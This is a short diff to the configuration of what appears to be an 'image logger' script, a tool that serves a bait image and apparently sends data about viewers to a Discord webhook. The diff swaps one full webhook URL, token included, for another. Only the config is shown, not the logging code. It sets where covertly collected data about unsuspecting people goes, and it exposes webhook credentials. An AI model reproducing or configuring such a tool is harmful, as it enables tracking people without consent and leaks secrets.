@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1377657655207657597/kVwsdlXTw_GJs3Juet6gcsFzrBZtVgdIq6ZaAOBKbOC1LS6PHjk5ljlHJlyffQ070qZZ",
+    "webhook": "https://discord.com/api/webhooks/1385381691123826839/ZlzBvxTFJtjOWjXF4-pzFtblEI2luXKtU6TjtQHD-vONeqw1qmNBkjt2YH5i5wD0PrNO",
     "image": "https://image.api.playstation.com/vulcan/ap/rnd/202011/0402/C784xeOFo2wViCf4m5bxgoeH.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
